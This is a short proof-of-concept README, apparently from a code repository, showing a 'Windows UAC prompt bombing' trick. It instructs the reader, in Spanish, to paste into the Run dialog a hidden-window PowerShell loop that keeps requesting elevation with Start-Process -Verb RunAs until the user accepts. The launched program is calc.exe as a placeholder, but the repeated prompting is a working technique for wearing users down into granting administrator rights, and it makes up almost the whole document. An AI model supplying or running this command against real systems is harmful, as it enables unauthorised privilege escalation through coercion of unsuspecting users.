# poc
Proof of concept

# Windows UAC PROMPT BOMBING  
WINDOWS + R  

PEGA ESTO:  
powershell.exe -WindowStyle Hidden while (1) { try { Start-Process calc.exe -Verb RunAs ; break } catch { Get-Item "+" }}

